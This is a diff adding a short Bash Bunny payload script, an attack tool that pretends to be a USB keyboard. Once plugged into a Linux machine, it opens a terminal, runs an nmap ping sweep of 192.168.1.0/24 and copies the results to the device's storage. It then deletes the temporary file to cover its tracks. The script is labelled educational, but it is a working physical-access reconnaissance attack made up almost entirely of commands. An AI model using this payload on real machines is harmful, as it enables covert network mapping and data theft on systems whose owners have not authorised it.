@@ -1,0 +1,36 @@
+#!/bin/bash
+# Title: Network Scanner and Device Enumerator
+# Description: Scan the local network for connected devices using nmap.
+# Author: jjarque1
+# Target: Linux
+# Payload developed for educational purposes only
+
+# Set up HID and storage attack modes
+ATTACKMODE HID STORAGE
+
+# Delay to allow the system to recognize the USB device
+QUACK DELAY 2000
+
+# Start a terminal (assumes shortcut Ctrl+Alt+T opens a terminal)
+QUACK CTRL ALT t
+QUACK DELAY 1000
+
+# Run nmap to scan the local network (replace 192.168.1.0/24 with the appropriate network range)
+QUACK STRING nmap -sP 192.168.1.0/24 > /tmp/network_scan.txt
+QUACK ENTER
+QUACK DELAY 15000  # Give time for the scan to complete
+
+# Copy the scan result to the Bash Bunny storage
+QUACK STRING cp /tmp/network_scan.txt /media/$USER/BashBunny/network_scan.txt
+QUACK ENTER
+QUACK DELAY 2000
+
+# Clean up by removing the scan file
+QUACK STRING rm /tmp/network_scan.txt
+QUACK ENTER
+
+# Close the terminal
+QUACK CTRL d
+
+# Eject the USB Bash Bunny
+ATTACKMODE OFF
